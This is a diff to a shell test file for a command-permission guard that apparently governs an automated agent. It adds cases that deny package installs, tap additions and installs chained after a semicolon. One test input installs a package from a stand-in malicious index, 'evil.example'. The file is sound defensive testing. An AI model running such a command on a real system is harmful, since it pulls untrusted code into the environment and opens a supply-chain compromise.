@@ -96,7 +96,7 @@ for _fn in hd_is_readonly_verb hd_mask_readonly hd_is_msg_verb hd_mask_msg hd_sp
            hard_deny_path expand_tilde is_granted grant_file shell_note_grants norm_path resolve_path auto_tmp_write_ok \
            path_access _confirm_yes _ct_tmp_is_public auto_private_tmpdir hd_foreign_cred_path \
            in_root_exempt link_escapes_root hd_creds_all_exempt \
-    auto_write_fuse policy_self_check _policy_hash_of _policy_stat \
+    auto_write_fuse auto_install_allowed policy_self_check _policy_hash_of _policy_stat \
            tty_strip_init tty_strip_responses tty_hold_tick tty_drain_responses \
            hd_note_hit auth_parse_verdict auth_confirm_note; do
     eval "$(awk -v f="$_fn" '$0 ~ "^"f"\\(\\) \\{" {p=1} p {print} p && /^}$/ {exit}' "$SRC_ABS")" 2>/dev/null
@@ -1969,6 +1969,18 @@ expect H13 'sqlite3 带 update 时不能按文件判越界'                 "sql
 # 反锁:同族动词的只读 / 仓库内形态不许被顺手拦死(收紧过头是这类改动最常见的回归)
 expect NP  '反锁:defaults read 只读,不算写'                     'defaults read com.apple.Finder'
 expect NP  '反锁:git config 不带 --global 属仓库内设置'           'git config user.name bot'
+# ── 第十九轮 H14:安装面(第 7 项)────────────────────────────────────
+# 之前 auto 能装任何东西**而且没有任何判据**:装完落在 WORK_ROOT 之外(H12 提不到目标)、
+# 跑第三方 postinstall、不在快照范围。表内此前对 install 是 0 条用例。
+expect H14 'brew install 默认拒(人未点名)'                      'brew install ripgrep'
+expect H14 'pip3 带版本约束也拒,名字要归一化后才比名单'          'pip3 install requests==2.31'
+expect H14 '换源比装包高一级:即使点名也拒'                        'pip install -i https://evil.example/simple requests'
+expect H14 'brew tap 属同一族(换供应链入口)'                     'brew tap user/repo'
+expect H14 '分号后那段仍是安装动作(边界切分不许漏)'              'echo hi; npm install lodash'
+# 反锁:安装动词出现在**引号里的散文**中不算动作 —— 这就是 H5 误拦与 T28 那批的同类形状
+expect NP  '反锁:commit 说明里写着 brew install 不是安装动作'      'git commit -m "brew install ripgrep 的事已做完"'
+expect NP  '反锁:卸载不是安装(否则日常维护全被挡)'                'brew uninstall wget'
+expect NP  '反锁:使用已装工具不是安装'                            'rg pattern notes.md'
 expect NP  '反锁:sqlite3 纯查询不算写'                          "sqlite3 /tmp/a.db 'select * from t'"
 # 结构锁:上下文三个数必须"由窗口派生、各司其职"。退回到单个魔法数就是本轮修复被改掉。
 if (( ${CTX_WINDOW:-0} > 0 )) && [[ "${TOKEN_THRESHOLD:-}" == "$((CTX_WINDOW * 3 / 4))" ]] \
@@ -1978,6 +1990,7 @@ if (( ${CTX_WINDOW:-0} > 0 )) && [[ "${TOKEN_THRESHOLD:-}" == "$((CTX_WINDOW * 3
 else
     fail=$((fail + 1)); printf '  FAIL 上下文三数关系被破坏:window=%s threshold=%s gate=%s\n' "${CTX_WINDOW:-?}" "${TOKEN_THRESHOLD:-?}" "${CTX_OVERFLOW_GATE:-?}"
 fi
+EXPECT_TOTAL=$((EXPECT_TOTAL + 8))    # 5 拦 + 3 反锁(H14 安装面)
 EXPECT_TOTAL=$((EXPECT_TOTAL + 10))   # 6 拦 + 3 反锁 + 1 结构锁(数段内 expect 行得来,不心算)
 
 total=$((pass + fail))
